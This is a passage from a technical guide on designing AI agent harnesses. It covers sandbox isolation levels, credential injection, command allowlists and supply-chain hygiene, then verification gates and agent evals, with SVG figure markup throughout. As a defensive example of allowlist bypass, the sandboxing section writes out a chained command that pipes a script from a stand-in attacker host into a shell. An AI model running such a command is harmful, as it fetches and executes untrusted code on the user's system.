<rect x="338.0" y="-2.0" width="236.0" height="12.0" rx="2" fill="#ffffff" stroke="none" stroke-width="1.2"/>
<text x="456.0" y="7.0" font-size="9" fill="#6b7a90" text-anchor="middle" font-weight="normal">production feedback returns to planning</text>
<text x="138.0" y="72.0" font-size="8" fill="#6b7a90" text-anchor="middle" font-weight="700">WHERE IT SITS IN THE HARNESS</text>
<path d="M102.7 208.5 L292 64 L292 252 L102.7 208.5 Z" fill="#FF9900" opacity="0.10"/>
<line x1="102.7" y1="208.5" x2="292" y2="64" stroke="#FF9900" stroke-width="1" stroke-dasharray="3 3" opacity="0.7"/>
<line x1="102.7" y1="208.5" x2="292" y2="252" stroke="#FF9900" stroke-width="1" stroke-dasharray="3 3" opacity="0.7"/>
<path d="M119.1 98.9 A64 64 0 0 1 156.9 98.9 L146.9 131.3 A30 30 0 0 0 129.1 131.3 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="138.0" y="87.5" font-size="9.5" fill="#44546f" text-anchor="middle" font-weight="normal">3 Tools</text>
<path d="M158.6 99.4 A64 64 0 0 1 189.2 121.7 L162.0 142.0 A30 30 0 0 0 147.7 131.6 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="180.9" y="104.4" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">4 Context</text>
<path d="M190.3 123.1 A64 64 0 0 1 202.0 159.1 L168.0 159.6 A30 30 0 0 0 162.5 142.7 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="207.4" y="140.9" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">5 Caching</text>
<path d="M202.0 160.9 A64 64 0 0 1 190.3 196.9 L162.5 177.3 A30 30 0 0 0 168.0 160.4 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="207.4" y="186.1" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">6 Memory</text>
<path d="M189.2 198.3 A64 64 0 0 1 158.6 220.6 L147.7 188.4 A30 30 0 0 0 162.0 178.0 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="180.9" y="222.6" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">7 Bounds</text>
<path d="M156.9 221.1 A64 64 0 0 1 119.1 221.1 L129.1 188.7 A30 30 0 0 0 146.9 188.7 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="138.0" y="241.5" font-size="9.5" fill="#44546f" text-anchor="middle" font-weight="normal">8 Agents</text>
<path d="M117.4 220.6 A64 64 0 0 1 86.8 198.3 L114.0 178.0 A30 30 0 0 0 128.3 188.4 Z" fill="#FF9900" stroke="#ffffff" stroke-width="1.6"/>
<text x="95.1" y="222.6" font-size="9.5" fill="#1a1a2e" text-anchor="end" font-weight="700">9 Sandbox</text>
<path d="M85.7 196.9 A64 64 0 0 1 74.0 160.9 L108.0 160.4 A30 30 0 0 0 113.5 177.3 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="68.6" y="186.1" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">10 Evals</text>
<path d="M74.0 159.1 A64 64 0 0 1 85.7 123.1 L113.5 142.7 A30 30 0 0 0 108.0 159.6 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="68.6" y="140.9" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">11 Cost</text>
<path d="M86.8 121.7 A64 64 0 0 1 117.4 99.4 L128.3 131.6 A30 30 0 0 0 114.0 142.0 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="95.1" y="104.4" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">12 Observe</text>
<circle cx="138.0" cy="160.0" r="27" fill="#232F3E"/>
<text x="138.0" y="159.0" font-size="8.5" fill="#ffffff" text-anchor="middle" font-weight="700">2 Core</text>
<text x="138.0" y="169.0" font-size="8.5" fill="#ffffff" text-anchor="middle" font-weight="700">loop</text>
<rect x="292.0" y="62.0" width="620.0" height="192.0" rx="8" fill="#f8f9fb" stroke="#dfe1e6" stroke-width="1.2"/>
<text x="308.0" y="82.0" font-size="11.5" fill="#1a1a2e" text-anchor="start" font-weight="700">Three boundaries around every command</text>
<rect x="312.0" y="92.0" width="586.0" height="156.0" rx="8" fill="none" stroke="#232F3E" stroke-width="1.2" stroke-dasharray="4 3"/>
<text x="322.0" y="105.0" font-size="8" fill="#232F3E" text-anchor="start" font-weight="700">HOST: MODEL CREDENTIALS STAY HERE</text>
<rect x="322.0" y="112.0" width="318.0" height="128.0" rx="6" fill="#e6f0ff" stroke="#0052CC" stroke-width="1.2"/>
<text x="332.0" y="126.0" font-size="8" fill="#0052CC" text-anchor="start" font-weight="700">SANDBOX: BOUND PATHS ONLY</text>
<rect x="334.0" y="146.0" width="96.0" height="26.0" rx="5" fill="#ffffff" stroke="#dfe1e6" stroke-width="1.2"/>
<text x="382.0" y="162.2" font-size="9" fill="#1a1a2e" text-anchor="middle" font-weight="600">Agent command</text>
<path d="M468.0 143.0 L491.0 159.0 L468.0 175.0 L445.0 159.0 Z" fill="#fffae6" stroke="#f5c56b" stroke-width="1.2"/>
<text x="468.0" y="162.0" font-size="8" fill="#1a1a2e" text-anchor="middle" font-weight="600">allowlist</text>
<rect x="506.0" y="146.0" width="118.0" height="26.0" rx="5" fill="#e3fcef" stroke="#1e7e34" stroke-width="1.2"/>
<text x="565.0" y="162.2" font-size="9" fill="#1e7e34" text-anchor="middle" font-weight="600">runs in /workspace</text>
<line x1="432.0" y1="159.0" x2="443.0" y2="159.0" stroke="#232F3E" stroke-width="1.4" marker-end="url(#c9-d)"/>
<line x1="492.0" y1="159.0" x2="503.0" y2="159.0" stroke="#1e7e34" stroke-width="1.4" marker-end="url(#c9-gr)"/>
<line x1="468.0" y1="176.0" x2="468.0" y2="198.0" stroke="#de350b" stroke-width="1.4" marker-end="url(#c9-r)"/>
<path d="M463.0 201.0 L473.0 211.0 M473.0 201.0 L463.0 211.0" stroke="#de350b" stroke-width="2.2" stroke-linecap="round"/>
<text x="468.0" y="226.0" font-size="8.5" fill="#de350b" text-anchor="middle" font-weight="600">chained command denied</text>
<path d="M570.0 199.0 L580.0 209.0 M580.0 199.0 L570.0 209.0" stroke="#de350b" stroke-width="2.2" stroke-linecap="round"/>
<text x="575.0" y="226.0" font-size="8.5" fill="#de350b" text-anchor="middle" font-weight="600">~/.ssh does not exist</text>
<rect x="630.0" y="147.0" width="20.0" height="24.0" rx="3" fill="#FF9900" stroke="none" stroke-width="1.2"/>
<text x="640.0" y="142.0" font-size="8.5" fill="#9a5b00" text-anchor="middle" font-weight="700">egress</text>
<line x1="624.0" y1="159.0" x2="628.0" y2="159.0" stroke="#1e7e34" stroke-width="1.4"/>
<rect x="690.0" y="144.0" width="112.0" height="30.0" rx="5" fill="#0052CC" stroke="#0052CC" stroke-width="1.2"/>
<text x="746.0" y="157.5" font-size="9.5" fill="#ffffff" text-anchor="middle" font-weight="600">Credential injector</text>
<text x="746.0" y="169.0" font-size="8.5" fill="#d6e4ff" text-anchor="middle" font-weight="normal">token added per URL</text>
<rect x="822.0" y="144.0" width="70.0" height="30.0" rx="5" fill="#e3fcef" stroke="#1e7e34" stroke-width="1.2"/>
<text x="857.0" y="162.2" font-size="9" fill="#1e7e34" text-anchor="middle" font-weight="600">allowed API</text>
<line x1="652.0" y1="159.0" x2="687.0" y2="159.0" stroke="#FF9900" stroke-width="1.4" marker-end="url(#c9-o)"/>
<line x1="804.5" y1="159.0" x2="819.5" y2="159.0" stroke="#1e7e34" stroke-width="1.4" marker-end="url(#c9-gr)"/>
<line x1="650.0" y1="149.0" x2="693.0" y2="124.0" stroke="#de350b" stroke-width="1.4" marker-end="url(#c9-r)"/>
<path d="M695.0 113.0 L705.0 123.0 M705.0 113.0 L695.0 123.0" stroke="#de350b" stroke-width="2.2" stroke-linecap="round"/>
<text x="712.0" y="122.0" font-size="8.5" fill="#de350b" text-anchor="start" font-weight="600">evil.example: not allowlisted</text>
<line x1="650.0" y1="169.0" x2="693.0" y2="199.0" stroke="#de350b" stroke-width="1.4" marker-end="url(#c9-r)"/>
<path d="M695.0 201.0 L705.0 211.0 M705.0 201.0 L695.0 211.0" stroke="#de350b" stroke-width="2.2" stroke-linecap="round"/>
<text x="712.0" y="210.0" font-size="8.5" fill="#de350b" text-anchor="start" font-weight="600">10.0.0.0/8: private range</text>
</svg>
</div>

Choose the weakest boundary that covers your threat model, because each step up the ladder costs startup time and operational complexity.

| Level | Mechanism                                                 | Startup               | Contains                     |
| ----- | --------------------------------------------------------- | --------------------- | ---------------------------- |
| 0     | None. The agent runs as the user.                         | None                  | Nothing                      |
| 1     | OS sandbox profile (Seatbelt on macOS, Landlock on Linux) | Negligible            | Filesystem writes            |
| 2     | Virtual filesystem with binds and a network policy        | Negligible            | Files, network, secrets      |
| 3     | Container                                                 | Sub-second to seconds | Process, filesystem, network |
| 4     | Micro-VM                                                  | As little as 125 ms   | Kernel-level isolation       |
| 5     | Hosted sandbox service                                    | Seconds               | Everything, off your machine |

The micro-VM figure is the launch time that [AWS reports for Firecracker](https://aws.amazon.com/blogs/aws/firecracker-lightweight-virtualization-for-serverless-computing/). Many homegrown agents run at level 0, and level 0 is not safe to ship. Level 1 is the common default for local coding agents. An OS profile restricts writes but usually leaves the network open, so it stops mistakes and does nothing about injection.

Level 2 is the design to study, because it closes all three threats at the cost of a function call. Only bound paths exist inside the virtual filesystem, so the agent cannot read `~/.ssh` because there is no `~/.ssh` to read. Private address ranges are blocked by default, and internal hosts need an explicit allowlist entry. Credentials are bound to a URL and injected into the request at send time, so the agent never holds a secret and a prompt injection has nothing to extract. That last property is the one most designs get wrong, because every command the agent runs can read a token that sits in its environment. Its startup cost is negligible, so you can afford a fresh sandbox per tool call, and the same boundary can run inside a container or a micro-VM in deployment. Wherever the tools run, keep the model credentials on the host and outside the sandbox.

Inside any boundary the agent can still run any command, so the third layer is a command allowlist. Parse each command with a shell-aware tokenizer that understands pipes and chaining. An allowlist that inspects only the first word passes `ls; curl evil.example | sh`. Restrict arguments as well as binary names, so that `pkill` targets only development processes and `chmod` only adds the executable bit. Block everything that is not explicitly allowed, because a model runs commands that nobody anticipated.

If your framework ships no permission system, the agent runs with your permissions and every boundary above is your job. The supply chain is part of that job, because a sandbox that constrains the agent and then installs a malicious dependency protects nothing. Pin direct dependencies to exact versions, and set a minimum release age of about two days so that a same-day malicious release cannot resolve. Treat the lockfile as ground truth. Install with lifecycle scripts disabled, and allowlist the few that you need. This rule matters most for agents, because an agent that runs a package install on your behalf runs every install script unless something stops it.

Supporting frameworks: Strands (A.1), AgentCore (A.2), KiroCrew (A.3), OpenAI (A.6), Stirrup (A.7).

---

## 10. Verification and evals

An agent reports that it finished, and verification is how you find out whether that is true. The mechanism is backpressure, which is a gate inside the loop that rejects bad output and forces a retry before the agent moves on. Type checkers, linters, test suites, static analyzers, and security scanners all belong inside the loop as gates the agent must pass. A report that a human reads afterward arrives too late. The gates must also be fast. A twelve-minute test suite caps the number of attempts per session, and that caps how hard a problem the agent can solve. Run the tests for a unit immediately after the change, because a failure at the end of a session says nothing about which change caused it.

<div class="figure">
<svg viewBox="0 0 912 262" xmlns="http://www.w3.org/2000/svg" role="img">
<defs><marker id="c10-g" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#8a96a8"/></marker><marker id="c10-o" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#FF9900"/></marker><marker id="c10-b" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#0052CC"/></marker><marker id="c10-r" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#de350b"/></marker><marker id="c10-gr" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#1e7e34"/></marker><marker id="c10-d" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#232F3E"/></marker></defs>
<polygon points="0.0,18.0 111.0,18.0 121.0,32.0 111.0,46.0 0.0,46.0" fill="#edf0f4"/>
<text x="55.5" y="35.6" font-size="10" fill="#6b7a90" text-anchor="middle" font-weight="normal">Plan</text>
<polygon points="114.0,18.0 225.0,18.0 235.0,32.0 225.0,46.0 114.0,46.0 124.0,32.0" fill="#edf0f4"/>
<text x="169.5" y="35.6" font-size="10" fill="#6b7a90" text-anchor="middle" font-weight="normal">Specify</text>
<polygon points="228.0,18.0 339.0,18.0 349.0,32.0 339.0,46.0 228.0,46.0 238.0,32.0" fill="#edf0f4"/>
<text x="283.5" y="35.6" font-size="10" fill="#6b7a90" text-anchor="middle" font-weight="normal">Build</text>
<polygon points="342.0,18.0 453.0,18.0 463.0,32.0 453.0,46.0 342.0,46.0 352.0,32.0" fill="#FF9900"/>
<text x="397.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Test</text>
<path d="M392.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<polygon points="456.0,18.0 567.0,18.0 577.0,32.0 567.0,46.0 456.0,46.0 466.0,32.0" fill="#FF9900"/>
<text x="511.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Verify</text>
<path d="M506.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<polygon points="570.0,18.0 681.0,18.0 691.0,32.0 681.0,46.0 570.0,46.0 580.0,32.0" fill="#FF9900"/>
<text x="625.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Deploy</text>
<path d="M620.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<polygon points="684.0,18.0 795.0,18.0 805.0,32.0 795.0,46.0 684.0,46.0 694.0,32.0" fill="#edf0f4"/>
<text x="739.5" y="35.6" font-size="10" fill="#6b7a90" text-anchor="middle" font-weight="normal">Eval</text>
<polygon points="798.0,18.0 909.0,18.0 919.0,32.0 909.0,46.0 798.0,46.0 808.0,32.0" fill="#FF9900"/>
<text x="853.5" y="35.6" font-size="10" fill="#232F3E" text-anchor="middle" font-weight="700">Operate</text>
<path d="M848.5 49.0 l5 6 l5 -6 z" fill="#FF9900"/>
<path d="M853.5 17.0 C853.5 -1.0 55.5 -1.0 55.5 17.0" fill="none" stroke="#8a96a8" stroke-width="1.2" stroke-dasharray="4 3" marker-end="url(#c10-g)"/>
<rect x="338.0" y="-2.0" width="236.0" height="12.0" rx="2" fill="#ffffff" stroke="none" stroke-width="1.2"/>
<text x="456.0" y="7.0" font-size="9" fill="#6b7a90" text-anchor="middle" font-weight="normal">production feedback returns to planning</text>
<text x="138.0" y="72.0" font-size="8" fill="#6b7a90" text-anchor="middle" font-weight="700">WHERE IT SITS IN THE HARNESS</text>
<path d="M80.9 178.5 L292 64 L292 252 L80.9 178.5 Z" fill="#FF9900" opacity="0.10"/>
<line x1="80.9" y1="178.5" x2="292" y2="64" stroke="#FF9900" stroke-width="1" stroke-dasharray="3 3" opacity="0.7"/>
<line x1="80.9" y1="178.5" x2="292" y2="252" stroke="#FF9900" stroke-width="1" stroke-dasharray="3 3" opacity="0.7"/>
<path d="M119.1 98.9 A64 64 0 0 1 156.9 98.9 L146.9 131.3 A30 30 0 0 0 129.1 131.3 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="138.0" y="87.5" font-size="9.5" fill="#44546f" text-anchor="middle" font-weight="normal">3 Tools</text>
<path d="M158.6 99.4 A64 64 0 0 1 189.2 121.7 L162.0 142.0 A30 30 0 0 0 147.7 131.6 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="180.9" y="104.4" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">4 Context</text>
<path d="M190.3 123.1 A64 64 0 0 1 202.0 159.1 L168.0 159.6 A30 30 0 0 0 162.5 142.7 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="207.4" y="140.9" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">5 Caching</text>
<path d="M202.0 160.9 A64 64 0 0 1 190.3 196.9 L162.5 177.3 A30 30 0 0 0 168.0 160.4 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="207.4" y="186.1" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">6 Memory</text>
<path d="M189.2 198.3 A64 64 0 0 1 158.6 220.6 L147.7 188.4 A30 30 0 0 0 162.0 178.0 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="180.9" y="222.6" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="normal">7 Bounds</text>
<path d="M156.9 221.1 A64 64 0 0 1 119.1 221.1 L129.1 188.7 A30 30 0 0 0 146.9 188.7 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="138.0" y="241.5" font-size="9.5" fill="#44546f" text-anchor="middle" font-weight="normal">8 Agents</text>
<path d="M117.4 220.6 A64 64 0 0 1 86.8 198.3 L114.0 178.0 A30 30 0 0 0 128.3 188.4 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="95.1" y="222.6" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">9 Sandbox</text>
<path d="M85.7 196.9 A64 64 0 0 1 74.0 160.9 L108.0 160.4 A30 30 0 0 0 113.5 177.3 Z" fill="#FF9900" stroke="#ffffff" stroke-width="1.6"/>
<text x="68.6" y="186.1" font-size="9.5" fill="#1a1a2e" text-anchor="end" font-weight="700">10 Evals</text>
<path d="M74.0 159.1 A64 64 0 0 1 85.7 123.1 L113.5 142.7 A30 30 0 0 0 108.0 159.6 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="68.6" y="140.9" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">11 Cost</text>
<path d="M86.8 121.7 A64 64 0 0 1 117.4 99.4 L128.3 131.6 A30 30 0 0 0 114.0 142.0 Z" fill="#e3e8ef" stroke="#ffffff" stroke-width="1.6"/>
<text x="95.1" y="104.4" font-size="9.5" fill="#44546f" text-anchor="end" font-weight="normal">12 Observe</text>
<circle cx="138.0" cy="160.0" r="27" fill="#232F3E"/>
<text x="138.0" y="159.0" font-size="8.5" fill="#ffffff" text-anchor="middle" font-weight="700">2 Core</text>
<text x="138.0" y="169.0" font-size="8.5" fill="#ffffff" text-anchor="middle" font-weight="700">loop</text>
<rect x="292.0" y="62.0" width="620.0" height="192.0" rx="8" fill="#f8f9fb" stroke="#dfe1e6" stroke-width="1.2"/>
<text x="308.0" y="82.0" font-size="11.5" fill="#1a1a2e" text-anchor="start" font-weight="700">Backpressure inside the loop, evals outside it</text>
<path d="M488.7 108.6 A68.0 68.0 0 0 1 526.4 136.0" fill="none" stroke="#8a96a8" stroke-width="1.5" marker-end="url(#c10-g)"/>
<path d="M538.0 171.6 A68.0 68.0 0 0 1 523.6 215.9" fill="none" stroke="#8a96a8" stroke-width="1.5" marker-end="url(#c10-g)"/>
<path d="M493.3 237.9 A68.0 68.0 0 0 1 446.7 237.9" fill="none" stroke="#8a96a8" stroke-width="1.5" marker-end="url(#c10-g)"/>
<path d="M416.4 215.9 A68.0 68.0 0 0 1 402.0 171.6" fill="none" stroke="#8a96a8" stroke-width="1.5" marker-end="url(#c10-g)"/>
<path d="M413.6 136.0 A68.0 68.0 0 0 1 451.3 108.6" fill="none" stroke="#8a96a8" stroke-width="1.5" marker-end="url(#c10-g)"/>
<rect x="434.0" y="97.0" width="72.0" height="18.0" rx="5" fill="#ffffff" stroke="#dfe1e6" stroke-width="1.2"/>
<text x="470.0" y="109.2" font-size="9" fill="#1a1a2e" text-anchor="middle" font-weight="600">traces</text>
<rect x="498.7" y="144.0" width="72.0" height="18.0" rx="5" fill="#ffebe6" stroke="#de350b" stroke-width="1.2"/>
<text x="534.7" y="156.2" font-size="9" fill="#de350b" text-anchor="middle" font-weight="600">failures</text>
<rect x="474.0" y="220.0" width="72.0" height="18.0" rx="5" fill="#ffffff" stroke="#dfe1e6" stroke-width="1.2"/>
<text x="510.0" y="232.3" font-size="9" fill="#1a1a2e" text-anchor="middle" font-weight="600">new tasks</text>
<rect x="394.0" y="220.0" width="72.0" height="18.0" rx="5" fill="#e6f0ff" stroke="#b3d4ff" stroke-width="1.2"/>
<text x="430.0" y="232.3" font-size="9" fill="#1a1a2e" text-anchor="middle" font-weight="600">CI suite</text>
<rect x="369.3" y="144.0" width="72.0" height="18.0" rx="5" fill="#e3fcef" stroke="#1e7e34" stroke-width="1.2"/>
<text x="405.3" y="156.2" font-size="9" fill="#1e7e34" text-anchor="middle" font-weight="600">deploy</text>
<path d="M497.4 157.5 A32.0 32.0 0 0 1 497.4 190.5" fill="none" stroke="#232F3E" stroke-width="1.6" marker-end="url(#c10-d)"/>
<path d="M486.5 201.4 A32.0 32.0 0 0 1 453.5 201.4" fill="none" stroke="#232F3E" stroke-width="1.6" marker-end="url(#c10-d)"/>
<path d="M442.6 190.5 A32.0 32.0 0 0 1 442.6 157.5" fill="none" stroke="#232F3E" stroke-width="1.6" marker-end="url(#c10-d)"/>
<path d="M453.5 146.6 A32.0 32.0 0 0 1 486.5 146.6" fill="none" stroke="#232F3E" stroke-width="1.6" marker-end="url(#c10-d)"/>
<circle cx="492.6" cy="151.4" r="3.6" fill="#FF9900"/>
<text x="504.6" y="142.4" font-size="8" fill="#9a5b00" text-anchor="middle" font-weight="600">types</text>
<circle cx="492.6" cy="196.6" r="3.6" fill="#FF9900"/>
<text x="504.6" y="211.6" font-size="8" fill="#9a5b00" text-anchor="middle" font-weight="600">lint</text>
<circle cx="447.4" cy="196.6" r="3.6" fill="#FF9900"/>
<text x="435.4" y="211.6" font-size="8" fill="#9a5b00" text-anchor="middle" font-weight="600">tests</text>
<circle cx="447.4" cy="151.4" r="3.6" fill="#FF9900"/>
<text x="435.4" y="142.4" font-size="8" fill="#9a5b00" text-anchor="middle" font-weight="600">interface</text>
<circle cx="470" cy="174" r="17" fill="#232F3E"/>
<text x="470.0" y="177.5" font-size="9" fill="#ffffff" text-anchor="middle" font-weight="700">agent</text>
<text x="316.0" y="118.0" font-size="8.5" fill="#1a1a2e" text-anchor="start" font-weight="700">outer loop:</text>
<text x="316.0" y="129.0" font-size="8.5" fill="#6b7a90" text-anchor="start" font-weight="normal">evals, every</text>
<text x="316.0" y="140.0" font-size="8.5" fill="#6b7a90" text-anchor="start" font-weight="normal">release</text>
<text x="316.0" y="204.0" font-size="8.5" fill="#1a1a2e" text-anchor="start" font-weight="700">inner loop:</text>
<text x="316.0" y="215.0" font-size="8.5" fill="#6b7a90" text-anchor="start" font-weight="normal">gates, every</text>
<text x="316.0" y="226.0" font-size="8.5" fill="#6b7a90" text-anchor="start" font-weight="normal">change</text>
<text x="646.0" y="104.0" font-size="9.5" fill="#1a1a2e" text-anchor="start" font-weight="700">Success rate of 75% per trial</text>
<line x1="646" y1="222.0" x2="884" y2="222.0" stroke="#dfe1e6" stroke-width="1"/>
<text x="641.0" y="225.0" font-size="8.5" fill="#6b7a90" text-anchor="end" font-weight="normal">0%</text>
<line x1="646" y1="167.0" x2="884" y2="167.0" stroke="#dfe1e6" stroke-width="1"/>
<text x="641.0" y="170.0" font-size="8.5" fill="#6b7a90" text-anchor="end" font-weight="normal">50%</text>
<line x1="646" y1="112.0" x2="884" y2="112.0" stroke="#dfe1e6" stroke-width="1"/>
<text x="641.0" y="115.0" font-size="8.5" fill="#6b7a90" text-anchor="end" font-weight="normal">100%</text>
<polyline points="646.0,139.5 672.4,118.9 698.9,113.7 725.3,112.4 751.8,112.1 778.2,112.0 804.7,112.0 831.1,112.0 857.6,112.0 884.0,112.0" fill="none" stroke="#0052CC" stroke-width="2"/>
<circle cx="646.0" cy="139.5" r="2.4" fill="#0052CC"/>
<circle cx="672.4" cy="118.9" r="2.4" fill="#0052CC"/>
<circle cx="698.9" cy="113.7" r="2.4" fill="#0052CC"/>
<circle cx="725.3" cy="112.4" r="2.4" fill="#0052CC"/>
<circle cx="751.8" cy="112.1" r="2.4" fill="#0052CC"/>
<circle cx="778.2" cy="112.0" r="2.4" fill="#0052CC"/>
<circle cx="804.7" cy="112.0" r="2.4" fill="#0052CC"/>
<circle cx="831.1" cy="112.0" r="2.4" fill="#0052CC"/>
<circle cx="857.6" cy="112.0" r="2.4" fill="#0052CC"/>
<circle cx="884.0" cy="112.0" r="2.4" fill="#0052CC"/>
<polyline points="646.0,139.5 672.4,160.1 698.9,175.6 725.3,187.2 751.8,195.9 778.2,202.4 804.7,207.3 831.1,211.0 857.6,213.7 884.0,215.8" fill="none" stroke="#FF9900" stroke-width="2"/>
<circle cx="646.0" cy="139.5" r="2.4" fill="#FF9900"/>
<circle cx="672.4" cy="160.1" r="2.4" fill="#FF9900"/>
<circle cx="698.9" cy="175.6" r="2.4" fill="#FF9900"/>
<circle cx="725.3" cy="187.2" r="2.4" fill="#FF9900"/>
<circle cx="751.8" cy="195.9" r="2.4" fill="#FF9900"/>
<circle cx="778.2" cy="202.4" r="2.4" fill="#FF9900"/>
<circle cx="804.7" cy="207.3" r="2.4" fill="#FF9900"/>
<circle cx="831.1" cy="211.0" r="2.4" fill="#FF9900"/>
<circle cx="857.6" cy="213.7" r="2.4" fill="#FF9900"/>
<circle cx="884.0" cy="215.8" r="2.4" fill="#FF9900"/>
<text x="884.0" y="128.0" font-size="8.5" fill="#0052CC" text-anchor="end" font-weight="700">pass@k: at least one passes</text>
<text x="778.2" y="194.4" font-size="8.5" fill="#9a5b00" text-anchor="start" font-weight="700">pass^k: all k pass</text>
<circle cx="698.9" cy="175.6" r="4.5" fill="none" stroke="#9a5b00" stroke-width="1.5"/>
<text x="691.9" y="179.6" font-size="8.5" fill="#9a5b00" text-anchor="end" font-weight="700">42% at k = 3</text>
<text x="646.0" y="234.0" font-size="8.5" fill="#6b7a90" text-anchor="middle" font-weight="normal">1</text>
<text x="751.8" y="234.0" font-size="8.5" fill="#6b7a90" text-anchor="middle" font-weight="normal">5</text>
<text x="884.0" y="234.0" font-size="8.5" fill="#6b7a90" text-anchor="middle" font-weight="normal">10</text>
<text x="765.0" y="246.0" font-size="8.5" fill="#6b7a90" text-anchor="middle" font-weight="normal">trials, k</text>
</svg>
</div>

Unit tests are not enough, because agents mark features complete that no user can reach. Give the agent browser or API automation and require it to use the running system: navigate, fill the form, take a screenshot, and read the response. This catches the bug that passes every backend test.

Agents grade their own work too generously, and they do it consistently enough that you design around it instead of prompting against it. Run a separate evaluator with its own context, whose only job is to grade output against criteria and return concrete feedback. You can tune a standalone evaluator toward skepticism. You cannot make a generator critical of its own work. The evaluator earns its cost only when the task sits at or beyond the edge of what the generator does alone. For work well inside the model's ability it is overhead, so decide per workload.

Never ask an evaluator whether output is good. Give it criteria it can score and a definition of good for each one. Add few-shot examples with score breakdowns, so that it is calibrated rather than guessing a scale, and a hard threshold that fails the work. Weight the criteria toward where the model is weakest, such as design originality, completeness, and edge cases. Models already produce code that compiles and passes basic tests, so a rubric weighted there always passes. For work too large for one pass, have the generator and the evaluator agree on what finished means before any code exists. The generator proposes what it will build and how success will be tested, and the evaluator approves the proposal first. That contract closes the gap between a high-level specification and a testable unit of work, which is where most ambiguous failures start.

Rules in a document are suggestions, and rules in a linter are rules. Encode architectural invariants as lint rules, structural tests, and CI gates, so that each rule applies everywhere at once in a codebase the agent writes. Put the remediation in the error message. A message that names the correct pattern lets the agent fix the violation without a human, and a message that says only "architectural violation" sends it guessing.

Make the system legible to agents as well as to people. An agent must be able to reconstruct the business domain from the code and the documentation alone. Prefer boring technology, because stable, composable APIs that appear often in training data are easier for a model to use correctly. Make the running system inspectable. Give each git worktree its own application instance, and expose DOM snapshots and screenshots from the browser. Put logs and metrics behind queryable APIs instead of in files that a human greps. Treat technical debt like garbage collection. An agent writes more code per day and copies whatever patterns it finds, so debt compounds faster. Recurring cleanup sessions that scan for drift from your principles and open small refactoring pull requests beat an annual cleanup that never gets scheduled.

Backpressure gates a single run. An eval measures the agent across a fixed set of tasks, outside the loop. It answers the question that no single run can answer: did this change make the agent better or worse? Without evals, every change to a prompt, a tool, or a model is a guess, and users find the regressions for you. Evaluate the harness and the model together, because that pairing is what ships.

A small vocabulary keeps the design precise. A task is one test, with an input and success criteria. A trial is one attempt at a task, and you run several because the agent is non-deterministic. A grader is logic that scores one aspect of a trial. The transcript is the full record of a trial, including messages, tool calls, and reasoning. The outcome is the final state of the environment. The last distinction matters most. An agent that says "your flight is booked" produced a transcript, and the outcome is whether a reservation exists in the database. Grade the outcome wherever you can reach it.

Start early and start small. [Anthropic recommends](https://www.anthropic.com/engineering/demystifying-evals-for-ai-agents) twenty to fifty tasks drawn from real failures as a first suite, because early changes have large effects and small samples detect them. Take the tasks from the checks you already run by hand before a release, and from the bug tracker and the support queue once users exist. Each task must be unambiguous, which means that two domain experts reach the same verdict independently, and everything the grader checks appears in the task text. Write a reference solution for every task. It proves that the task is solvable and that the grader accepts a correct answer. When a capable model fails a task on every trial, suspect the task before the model. Balance the set as well. If you only test that the agent searches when it must, you tune an agent that searches for everything, so include the cases where it must not search.

Graders come in three kinds, and a good suite uses all of them.

